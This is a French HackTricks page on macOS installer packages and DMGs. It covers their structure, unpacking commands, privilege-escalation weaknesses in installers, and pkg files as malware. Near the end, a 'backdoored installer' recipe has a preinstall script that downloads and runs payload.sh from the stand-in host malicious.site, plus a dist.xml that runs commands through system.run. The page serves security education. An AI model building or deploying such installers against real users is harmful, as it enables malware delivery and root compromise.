# Abus des Installateurs macOS

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

## Informations de Base sur le Pkg

Un **package d'installateur macOS** (également connu sous le nom de fichier `.pkg`) est un format de fichier utilisé par macOS pour **distribuer des logiciels**. Ces fichiers sont comme une **boîte qui contient tout ce dont un logiciel** a besoin pour s'installer et fonctionner correctement.

Le fichier de package lui-même est une archive qui contient une **hiérarchie de fichiers et de répertoires qui seront installés sur l'ordinateur cible**. Il peut également inclure des **scripts** pour effectuer des tâches avant et après l'installation, comme la configuration de fichiers ou le nettoyage des anciennes versions du logiciel.

### Hiérarchie

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribution (xml)** : Personnalisations (titre, texte de bienvenue…) et vérifications de script/d'installation
* **PackageInfo (xml)** : Infos, exigences d'installation, emplacement d'installation, chemins vers les scripts à exécuter
* **Bill of materials (bom)** : Liste des fichiers à installer, mettre à jour ou supprimer avec les permissions de fichiers
* **Payload (archive CPIO compressée gzip)** : Fichiers à installer dans l'`install-location` depuis PackageInfo
* **Scripts (archive CPIO compressée gzip)** : Scripts pré et post installation et autres ressources extraites dans un répertoire temporaire pour exécution.

### Décompresser
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Pour visualiser le contenu de l'installateur sans le décompresser manuellement, vous pouvez également utiliser l'outil gratuit [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Informations de base sur DMG

Les fichiers DMG, ou images disque Apple, sont un format de fichier utilisé par macOS d'Apple pour les images disque. Un fichier DMG est essentiellement une **image disque montable** (il contient son propre système de fichiers) qui contient des données brutes généralement compressées et parfois chiffrées. Lorsque vous ouvrez un fichier DMG, macOS **le monte comme s'il s'agissait d'un disque physique**, vous permettant d'accéder à son contenu.

{% hint style="danger" %}
Notez que les installateurs **`.dmg`** prennent en charge **tellement de formats** que par le passé, certains d'entre eux contenant des vulnérabilités ont été abusés pour obtenir **l'exécution de code du noyau**.
{% endhint %}

### Hiérarchie

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

La hiérarchie d'un fichier DMG peut être différente en fonction du contenu. Cependant, pour les DMG d'application, elle suit généralement cette structure :

* Niveau supérieur : C'est la racine de l'image disque. Elle contient souvent l'application et éventuellement un lien vers le dossier Applications.
* Application (.app) : C'est l'application réelle. Dans macOS, une application est généralement un paquet qui contient de nombreux fichiers et dossiers individuels qui composent l'application.
* Lien Applications : C'est un raccourci vers le dossier Applications dans macOS. Le but de cela est de vous faciliter l'installation de l'application. Vous pouvez faire glisser le fichier .app vers ce raccourci pour installer l'application.

## Privesc via abus de pkg

### Exécution depuis des répertoires publics

Si un script d'installation pré ou post est par exemple exécuté depuis **`/var/tmp/Installerutil`**, un attaquant pourrait contrôler ce script pour qu'il élève les privilèges chaque fois qu'il est exécuté. Ou un autre exemple similaire :

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

C'est une [fonction publique](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que plusieurs installateurs et mises à jour appelleront pour **exécuter quelque chose en tant que root**. Cette fonction accepte le **chemin** du **fichier** à **exécuter** comme paramètre, cependant, si un attaquant pouvait **modifier** ce fichier, il serait en mesure de **profiter** de son exécution avec root pour **élever les privilèges**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Pour plus d'informations, consultez cette conférence : [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Exécution par montage

Si un installateur écrit dans `/tmp/fixedname/bla/bla`, il est possible de **créer un montage** sur `/tmp/fixedname` sans propriétaires afin que vous puissiez **modifier n'importe quel fichier pendant l'installation** pour abuser du processus d'installation.

Un exemple de cela est **CVE-2021-26089** qui a réussi à **écraser un script périodique** pour obtenir une exécution en tant que root. Pour plus d'informations, jetez un œil à la conférence : [**OBTS v4.0 : "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg en tant que malware

### Charge utile vide

Il est possible de générer simplement un **`.pkg`** avec des **scripts pré et post-installation** sans aucune véritable charge utile à part le malware à l'intérieur des scripts.

### JS dans le xml de distribution

Il est possible d'ajouter des **`<script>`** dans le fichier **xml de distribution** du paquet et ce code sera exécuté et pourra **exécuter des commandes** en utilisant **`system.run`** :

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Installateur avec porte dérobée

Installateur malveillant utilisant un script et du code JS à l'intérieur de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Références

* [**DEF CON 27 - Déballage de Pkgs Un Regard à l'Intérieur des Paquets d'Installateur Macos et des Failles de Sécurité Courantes**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0 : "Le Monde Sauvage des Installateurs macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Déballage de Pkgs Un Regard à l'Intérieur des Paquets d'Installateur MacOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
